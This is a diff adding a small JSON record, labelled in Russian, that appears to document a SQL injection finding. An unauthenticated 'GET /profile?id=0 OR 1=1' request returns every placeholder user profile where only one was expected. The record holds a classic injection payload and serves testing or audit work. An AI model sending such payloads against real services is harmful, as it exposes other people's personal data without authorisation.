@@ -1,0 +1,21 @@
+{
+  "name": "01_sqli_profile",
+  "title": "SQL-инъекция в GET /profile?id=",
+  "request": "GET /profile?id=0 OR 1=1  (без токена)",
+  "status": 200,
+  "response": [
+    {
+      "id": 1,
+      "name": "TEST_ALICE",
+      "email": "alice@example.invalid",
+      "address": "TEST_ADDRESS_A"
+    },
+    {
+      "id": 2,
+      "name": "TEST_BOB",
+      "email": "bob@example.invalid",
+      "address": "TEST_ADDRESS_B"
+    }
+  ],
+  "verdict": "Вернулись ВСЕ профили вместо одного"
+}
